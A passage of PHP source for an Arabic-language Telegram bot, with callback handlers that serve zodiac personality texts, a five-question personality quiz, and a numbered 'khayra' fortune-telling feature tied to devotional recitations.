'text'=>"شخصية برج العقرب: من أكثر الشخصيات إثارة وغموضاً من بين علامات الأبراج متقلبة المزاج في بعض الأوقات لكنها تعرف جيدا كيف تتغلب على هذا الأمر الأشياء الطبيعية في الحياة، فستجدها مهتمة بالتجارب الروحانية مما يكوّن لديها معتقدات ورؤى خاصة في وصف الحياة تتميز  بأنها شديدة الملاحظة وفد تبدو بلا حيلة على عكس الواقع هي أيضا صريحة وذكية وتكره اللون الرمادي فترى الأشياء في الحياة إما باللون الأبيض أو الأسود عادة ما تفهم امرأة العقرب الناس جيدا تعرف كيف تصيغ أسئلتها لتحصل على الإجابة التي تتمناها قليلا ما تخاف كما أنها مسيطرة وعنيدة في بعض الأحيان عندما تزيد صعوبات الحياة لا تستلم بسهولة بل تحاول استكمال حياتها بإصرار وهي واقفة على قدميها تثق بنفسها كثيرا وتتميز بمداركها الواسعة. شخصيتها معقدة بعض الشيء ومليئة بالأسرار ولا تفصح بسهولة عن الأسرار التي تكمن بداخلها العقرب مع الحب والعلاقات العاطفية عاشقة ومخلصة لشريك حياتها تستطيع الحصول على أي رجل تتمناه لما تتمتع به من شخصية جذابة ولافتة تسعى  إلى تسهيل الحياة على شريكها قدر المستطاع ويظهر ذلك من خلال اهتمامها به والإخلاص له يقال دوم حذروا من    إلحابه العلاقات المصطنعة وتبحث دوما العلاقات المليئة بالحب قد يظن البعض أن امرأة العقرب هي الشخص الأكثر سيطرة في العلاقة بينها وبين الرجل إلا أن هذا ليس صحيحا بالضرورة,",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q8"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"شخصك هو ملك العلاقات حيث أنه يحترف التواصل مع الآخرين. هو أيضا ذكي وملم بكم هائل من المعلومات حول مجالات شتى من الحياة. أدائه سريع، وذكي ويتمتع بسرعة البديهة يحاول طوال الوقت رؤية الأمور من أكثر من منظور ومراجعة كل الخيارات المتاحة ويضع مقارنات مستمرة في عقله بين المميزات والعيوب ليصل إلى ما يجعله راضيا ويحقق له التوازن النفسي.
قد يجد صعوبة في اتخاذ القرار كما أن حالته المزاجية قد تتبدل سريعا، لكنه في الوقت ذاته يتمتع بشخصية مرنة ولا يمانع من السير مع التيار. إلى جانب ذلك فإن لديه اهتمامات عديدة في مجالات مختلفة كما أن شخصيته اجتماعية ويتعلق بكل ما هو مختلف تتمتع بشخصية ساحرة ويحب المغازلة ويصعب عليك مقاومة سحره لايسهل الإيقاع به كما أن تصرفاته غير متوقعة ويتقن إخفاء مشاعره عن الآخرين لاتشعر بالراحة مع فكرة الحب، لذا لا يقع فيه بسهولة، فهو يفكر بعقله أكثر من قلبه ولكن عندما يحب نجد أنه حبيب مرح ولديه لفتات رومانسية رائعة. يعتقد الآخرين أنك متبلد المشاعر ولكنه في الواقع يحجب مشاعره لأنه يحب أن يفكر في كل شيء بعقلانية هو أيضا مستمع جيد ويعلم كيف يدير أفكاره جيدا للوصول إلى ما يحقق له التوازن النفسي الروتين قد يقتل العلاقة لأنه سيخسر بذلك المتعة التي يبحث عنها طوال الوقت.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q9"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ساحرة، ذكية، ناقدة بالفطرة ومحللة موهوبة. لديها القدرة على الحكم بمنطقية على أفعال الآخرين والمواقف المختلفة.  إلى جعل كل شيء من حولها منظم، فهي شخصية عملية وتهتم كثيرا بالتفاصيل الصغيرة تعشق النظام والترتيب، هي أيضا من الشخصيات المتواضعة والمجتهدة في عملها. تتحمس كثيرا نحو الأهداف السامية والقضايا العظيمة وتبذل كل ما لديها من جهد سعيا وراء خدمة هذه القضايا لا يمكن أن تقابل شخصيت العذراء بملابس غير مهندمة أو لم يتم كيها جيدا. وقد تكون عدوة نفسها عندما تبالغ في تحليل وفحص كل موقف صغير يمر عليها. يختبئ وراء شخصيتها الهادئة والصبورة، بركان فياض من العواطف والمشاعر من الصعب إرضائها، لذا يجب أن يكون شريك حياتها المستقبلي قادرا على تحقيق رغباتها ومتطلعاتها التي قد تكون عالية في بعض الأحيان. تؤمن جداً بوجود الحب الحقيقي والحب الواقعي ولكنها لا تؤمن بهذا الحب المصور في القصص الخيالية بشخصية عاطفية وفياضة المشاعر وتتطلع إلى الكمال. قبل أن تدخل في أية علاقة عاطفية، تقوم بتحليل كل شيء جيدا وتبحث في عيوب الآخر وتحاول اكتشاف حقيقة مشاعره فهي من الشخصيات التي لا تقع في الحب بسهولة أو تعلن عنه ببساطة لكن بمجرد أن تجد الشخص الأمثل لها تصبح عاشقة ومخلصة وشديدة التعلق ويمكن الاعتماد عليها ,",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q10"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ساحرة، ذكية، ناقدة بالفطرة ومحللة موهوبة. لديها القدرة على الحكم بمنطقية على أفعال الآخرين والمواقف المختلفة.  إلى جعل كل شيء من حولها منظم، فهي شخصية عملية وتهتم كثيرا بالتفاصيل الصغيرة تعشق النظام والترتيب، هي أيضا من الشخصيات المتواضعة والمجتهدة في عملها. تتحمس كثيرا نحو الأهداف السامية والقضايا العظيمة وتبذل كل ما لديها من جهد سعيا وراء خدمة هذه القضايا لا يمكن أن تقابل شخصيت العذراء بملابس غير مهندمة أو لم يتم كيها جيدا. وقد تكون عدوة نفسها عندما تبالغ في تحليل وفحص كل موقف صغير يمر عليها. يختبئ وراء شخصيتها الهادئة والصبورة، بركان فياض من العواطف والمشاعر من الصعب إرضائها، لذا يجب أن يكون شريك حياتها المستقبلي قادرا على تحقيق رغباتها ومتطلعاتها التي قد تكون عالية في بعض الأحيان. تؤمن جداً بوجود الحب الحقيقي والحب الواقعي ولكنها لا تؤمن بهذا الحب المصور في القصص الخيالية بشخصية عاطفية وفياضة المشاعر وتتطلع إلى الكمال. قبل أن تدخل في أية علاقة عاطفية، تقوم بتحليل كل شيء جيدا وتبحث في عيوب الآخر وتحاول اكتشاف حقيقة مشاعره فهي من الشخصيات التي لا تقع في الحب بسهولة أو تعلن عنه ببساطة لكن بمجرد أن تجد الشخص الأمثل لها تصبح عاشقة ومخلصة وشديدة التعلق ويمكن الاعتماد عليها ,",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q11"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"شخصية برج القوس من الشخصيات الفضولية للغاية وتسعى لاكتشاف أشياء جديدة في الحياة كما أنها تبحث عن الحقيقة في كل أمر لديها جانب فلسفي في التفكير وتحب اكتشاف الفرص الجديدة والخيارات المتاحة أمامها ولا تيأس في ذلك شخصيتك متحررة، ساحرة تحب التغيير وعندما تدخل أي مكان تعلم أن معظم الأنظار عليها. هي مستقلة ومتفتحة العقل ولا تعمل وفقا لجدول لأنه يشعرها بالتقيد. تحتاج إلى المرونة في حياتها وتحب أن تشعر بأنها قادرة على تغيير خططها بما يناسبها بشكل أفضل. لا أحد يملي على هذه المرأة ما تفعله فتصرفاتها تنبع منها فقط تبحث عن الشخص الذي يستطيع أن يكون صديقا لها قبل أن يكون شريك حياتها لتكون قادرة على مشاركته المعني الحقيقي للحب. إنها صادقة ومخلصة وتستحق ثقة الآخرين، تستطيع  أن تحتفظ بقدر من الاستقلالية التي تزيدها جاذبية وسحرا في عيون الشخص. إلا أن المشكلة التي تقع دوما، هي صعوبة التقرقة بين الصداقة والحب كما أنها تقع في الحب سريعا ومع ذلك فإنها تحرص على أخذ وقتا كافيا للتعرف على الشخص الذي تحبه قبل الزواج منه. تحب  الشعور بالأمان والحماية من قبل شريك حياتها ولكنها في الوقت ذاته ترفض أن تُوجّه إليها الأوامر طوال الوقت.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q12"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"شخصية دبلوماسية ورومانسية وحنونة ولديها جانب روحاني. هي أيضا جذابة وشاعرية وعليك أن تكون حذرا عندما تتعامل مع عواطفها لأنها امرأة حساسة بدرجة كبيرة. تهتم  بمن حولها لكنها غامضة بعض الشئ لديها عقلا نشيطا ويفكر طول الوقت وهي دائمة البحث عن المعنى العميق للحياة تتمتع  بشخصية ساحرة تستطيع أن تلفت أنظار الآخرين إليها، كما أنها ناعمة ومليئة بالأنوثة وليس من السهل خداعها. إذا كنت في علاقة عاطفية مع ، فيفضل أن تكون صريحا معها لأنها إما ستتبع أسلوبها المسيطر معك أو ستختفي عنك ببساطة. من الأفضل أن تكون دبلوماسيا ولطيفا عند التعامل معها ولا تحاول أن تثير غيرتها وغضبها طوال الوقت لأنها ستشعر بهذه الطريقة بأنها غير محببة بالنسبة لك.
امرأة الحوت رومانسية للغاية وعادة ما تفقد نفسها في العلاقة العاطفية. تتمتع أيضا بأنوثة عالية مما يجعلها من الشخصيات الأكثر جذبا للرجال. إلى جانب ذلك، فهي هادئة ويسهل التعامل معها وحساسة جدا وتهتم جدا باحتياجات الآخرين. راعي فقد ألا تستغل عطفها وحنانها وطبيعتها الخدومة حتى لا تخسرها!",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

##------------------------------------------##

if ($data == "#2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"السؤال الاول: ماهي هوايتكَ المُفضلة ؟",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"الرسم؟",'callback_data'=>"#q1"],['text'=>"الطبخ؟",'callback_data'=>"#q2"]],
[['text'=>"الخياطه؟",'callback_data'=>"#q3"],['text'=>"الرقص؟",'callback_data'=>"#q4"]],
[['text'=>"التصوير؟",'callback_data'=>"#q5"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#q1"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنتَ شخص يُحب العزلة مع إنكَ لديكَ الكثير من الأصدقاء ، أنتَ شخص حنون وصادق في مشاعرِه ، رومانسي قي بعضِ الاحيان ، طبيعي لاتُحب التصنع .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a2"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#q2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنتَ شخص مرح وخفيف الظل ، لاتؤمن بالحُب مِن النظرة الأولى ، شخصيتُكَ ضعيفة جداً ، مُتكبر ، اصدقائُكَ مُحددون و قليلون .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a2"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#q3"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنت شخص غير طموح تُضيع الكثير من وقتِك ، غالباً ماتفشل في علاقاتِك ، شخصيتُكَ قوية ، غير جاد في عِلاقات الحُب ، شخص قنوع بِما لديه .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a2"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#q4"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنتَ شخص راقي تتميز بِصفات لا يتملكها كُل الناس ، جميل ، في اغلب الأوقات رومانسي ، حساس وتُحب الأناقة .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a2"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#q5"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنتَ شخص رومانسي ، طموح جداً لاتبحث عن الحُب بل تبحث عن الوفاء ، نضراتُك دائماً مُرتبكة ، حساس ، أنتَ شخص يُحب النوم والأحلام ، لديكَ قلق عِندما تواجِه مَن تُحب .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a2"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "a2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"السؤال الثاني: ماهو لونكَ المُفصل ؟",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"اسود",'callback_data'=>"#w"],['text'=>"اخضر",'callback_data'=>"#w"]],
[['text'=>"ابيض",'callback_data'=>"#w"],['text'=>"احمر",'callback_data'=>"#w"]],
[['text'=>"بنفسجي",'callback_data'=>"#w"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#w"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنت شخص جذاب ، ودود ، نشيط ، عفوي ، تحب إسعاد الآخرين حتى لوكان ذلك ع حساب سعادتك الشخصية ، طيب القلب ، مخلص لعائلتك واصدقائك .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a3"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "a3"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"السؤال الثالث: أختر رقم من الارقام التالية",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"1",'callback_data'=>"#e"],['text'=>"2",'callback_data'=>"#e"]],
[['text'=>"3",'callback_data'=>"#e"],['text'=>"4",'callback_data'=>"#e"]],
[['text'=>"5",'callback_data'=>"#e"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#e"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"مايميزك عن غيرك هو أنك تعتمد ع مبدأ كل شيء أو لاشيء في حياتك ، فأنت لا تختار الوسطية ولا ترضى بأنصاف الحلول ، أما مشاعر الحب لديك تنقلب بيرعة الى كره ونفور ، يعتبرك الآخرين سريع الغضب و مندفع ولا تتصرف بعقلانية .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a4"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "a4"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"السؤال الرابع : ماهو اكثر شي تحبه ؟",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"الغيوم",'callback_data'=>"#r"],['text'=>"الورد",'callback_data'=>"#r"]],
[['text'=>"الشجر",'callback_data'=>"#r"],['text'=>"القطط",'callback_data'=>"#r"]],
[['text'=>"النحل",'callback_data'=>"#r"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#r"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنت  شخصية كريمة جدا لديك الكثير من الطيبة والحنية وانت مثال على الصبر وحب الخير لكل الناس .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a5"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "a5"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"السؤال الخامس: لو خيروك ترسم اشكال هندسية ماذا ستختار ؟",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"مثلث",'callback_data'=>"#t"],['text'=>"مستطيل",'callback_data'=>"#t"]],
[['text'=>"مربع",'callback_data'=>"#t"],['text'=>"مكعب",'callback_data'=>"#t"]],
[['text'=>"دائره",'callback_data'=>"#t"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "#t"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنت شخصية قوية وحاسمة وواثق جدا من نفسه ، ذكي وله قدرة كبيرة على التركيز ، يأخذ القرارات الصحيحة والحاسمة ، جدي في تحقيق هدفه ، لا يحب التأخر عن مواعيده ويحرص على الوصول مبكرا ومنهم من يقاطع غيره أثناء الكلام ، ملتزم بالتميز والتفوق ، واضح ولا يحب  اللف والدوران والكذب ، يجيد التعامل مع الأزمات ، مخلص في واجباته وأعماله ، يصلح للقيادة وتولي زمام الأمور ، سريع الغضب ولا يعترف بأخطائه أحياناً .",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- السؤال التالي...",'callback_data'=>"a!!"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "a!!"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"
🚫 عذراً تم الانتهاء من الاسئلة سيتم اضافه العديد من الاسئلة قريبا...

- قم بمعرفه شخصيتك بالضغط على زر ( تحليل شخصيتي ) في الاسفل.
",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- تحليل شخصيتي.",'callback_data'=>"!a!"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "!a!"){
bot('sendphoto',['chat_id'=>$chatid,
'photo' =>$pr[array_rand($pr,1)],
'caption' =>"- شخصيتك هي 🙄♥️

$txtfree",
'parse_mode'=>HTML,]);}

if($text == '/rt' ){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"اهلا

$txtfree",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"html",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"🖤 أخـذ خـيـرة .",'callback_data'=>"1g"]],
[['text'=>"♥️ ڪيفية أخـذ خـيـرة .",'callback_data'=>"2"]],
]])]);}

if ($data == "1"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
 'text'=>"$start

$txtfree",
'parse_mode'=>"html",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"🖤 أخـذ خـيـرة .",'callback_data'=>"1g"]],
[['text'=>"♥️ ڪيفية أخـذ خـيـرة .",'callback_data'=>"2"]],
]])]);}

if ($data == "2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
 'text'=>"
- الفاتحة 1 مرة 💜.
- القدر 3 مرات 🖤.
- الصلاة على النبي 3 مرات
- أنـــوي ♥️
- واختارو رقم من ( 1 لـ 60 ) 💙.
————————————
$txtfree",
'parse_mode'=>"html",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "1g"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اختارو رقم من ( 1 لـ 60 ) 💙.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup' => json_encode(['inline_keyboard' => [
[['text'=>"1",'callback_data'=>"f1"],['text'=>"2",'callback_data'=>"f2"]],
[['text'=>"3",'callback_data'=>"f3"],['text'=>"4",'callback_data'=>"f4"]],
[['text'=>"5",'callback_data'=>"f5"],['text'=>"6",'callback_data'=>"f6"]],
[['text'=>"7",'callback_data'=>"f7"],['text'=>"8",'callback_data'=>"f8"]],
[['text'=>"9",'callback_data'=>"f9"],['text'=>"10",'callback_data'=>"f10"]],
[['text'=>"11",'callback_data'=>"f11"],['text'=>"12",'callback_data'=>"f12"]],
[['text'=>"13",'callback_data'=>"f13"],['text'=>"14",'callback_data'=>"f14"]],
[['text'=>"15",'callback_data'=>"f15"],['text'=>"16",'callback_data'=>"f16"]],
[['text'=>"17",'callback_data'=>"f17"],['text'=>"18",'callback_data'=>"f18"]],
[['text'=>"19",'callback_data'=>"f19"],['text'=>"20",'callback_data'=>"f20"]],
[['text'=>"21",'callback_data'=>"f21"],['text'=>"22",'callback_data'=>"f22"]],
[['text'=>"23",'callback_data'=>"f23"],['text'=>"24",'callback_data'=>"f24"]],
[['text'=>"25",'callback_data'=>"f25"],['text'=>"26",'callback_data'=>"f26"]],
[['text'=>"27",'callback_data'=>"f27"],['text'=>"28",'callback_data'=>"f28"]],
[['text'=>"29",'callback_data'=>"f29"],['text'=>"30",'callback_data'=>"f30"]],
[['text'=>"31",'callback_data'=>"f31"],['text'=>"32",'callback_data'=>"f32"]],
[['text'=>"33",'callback_data'=>"f33"],['text'=>"34",'callback_data'=>"f34"]],
[['text'=>"35",'callback_data'=>"f35"],['text'=>"36",'callback_data'=>"f36"]],
[['text'=>"37",'callback_data'=>"f37"],['text'=>"38",'callback_data'=>"f38"]],
[['text'=>"39",'callback_data'=>"f39"],['text'=>"40",'callback_data'=>"f40"]],
[['text'=>"41",'callback_data'=>"f41"],['text'=>"42",'callback_data'=>"f42"]],
[['text'=>"43",'callback_data'=>"f43"],['text'=>"44",'callback_data'=>"f44"]],
[['text'=>"45",'callback_data'=>"f45"],['text'=>"46",'callback_data'=>"f46"]],
[['text'=>"47",'callback_data'=>"f47"],['text'=>"48",'callback_data'=>"f48"]],
[['text'=>"49",'callback_data'=>"f49"],['text'=>"50",'callback_data'=>"f50"]],
[['text'=>"51",'callback_data'=>"f51"],['text'=>"52",'callback_data'=>"f52"]],
[['text'=>"53",'callback_data'=>"f53"],['text'=>"54",'callback_data'=>"f54"]],
[['text'=>"55",'callback_data'=>"f55"],['text'=>"56",'callback_data'=>"f56"]],
[['text'=>"57",'callback_data'=>"f57"],['text'=>"58",'callback_data'=>"f58"]],
[['text'=>"59",'callback_data'=>"f59"],['text'=>"60",'callback_data'=>"f60"]],
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f1"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندك رزق أو قسمة أو سفرة أو فلوس راح توصلك وأهتم بالمقابيل لان يحبك وأهتم بنفسك عندك فرحة قريبة ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"دائما حزين ومهموم انت راح يفرج همك وراح ترتاح واكفلك الامام علي (عليه السلام) أهتم باهلك️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f3"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"كو عندج نذر وفي وعندج قسمة حلوة بس اول شيء رح ياخذون رايج يلة يتقدمون والشخص تجارته حلوة ورح تنسعدين ان شاء الله ، الله دائما ينقذج من شغلات متتوقعين انو تخلصين لان انتي نظيفة وع نياتج .️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f4"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"منتظره شي راح يجيج بس احذري تكولين للناس لأن انتي كول ما تكولين شغله لأحد تخرب قللي ثقتج بالناس واكو شخص بحياتج لا تنطي أكبر من حجمه ترا كولش شايف نفسه عليج انتي ناخيه العباس ومراح يردج وراح تحلمين حلم حلو بشغله انتي مشغول بالج عليه بس خففي من العصبيه.️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f5"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"لاتفقد الأمل بالله حلمك راح يتحقق راح تجيك أيام حلوة ولاتحجي سرك لأحد لان اكو ناس تكرهك .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f6"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"انت اكوو عندك شخص يحبك اهواي بس اكو ناس دتخرب عليك عندك مشكلة بس راح تنحل بفضل صبرك ودعائك️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f7"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"لاتمشي بهذا الطريق بي خطر عليك انتضر واكفلك الامام الكاظم (عليه السلام) انت طالبة بشغلة وراح تصير بس اكو ناس ابتعد عنهم ناس قريبين عليك .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f8"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندك شي خايف منه وتفكر بي هواي انت نخيت ابو فاظل (عليه السلام) وابو فاظل راح يخلصها الك عندك عدو احذر منه راح يااذيك .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f9"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندج ندم على شغله ودائمن تحجين بلخسارة لتخافين ولا تضوجين
ان شاء الله فترة وتعدي عندج مكان تردين ترحين اله ومحتارة روحى بي خير الج.
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f10"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"واكفلج موسى ابن جعفر ونادبته على شغله وعندج نصيب قريب وفرحه من اقرب الناس الج ودائمن لتثقين بلمقابيل بسهوله واحفظي سرج وظالمينج لمنج وبيج.
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f11"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندج بعد 12 يوم او 10 ايام بشارة تفرحج اعمال متعبتج شغله غيرة من النساء وقسمتج دائمن متعرقله تفكرين اهواية تعبانه انطي مجال لنفسج لان تعبين صحتج
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f12"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"أنت شخص طيب وتنحب بس حظ ماعندك ، عندك شغلة طالبها من أم البنين وقريبا راح تتحقق وراح تفرح .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f13"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
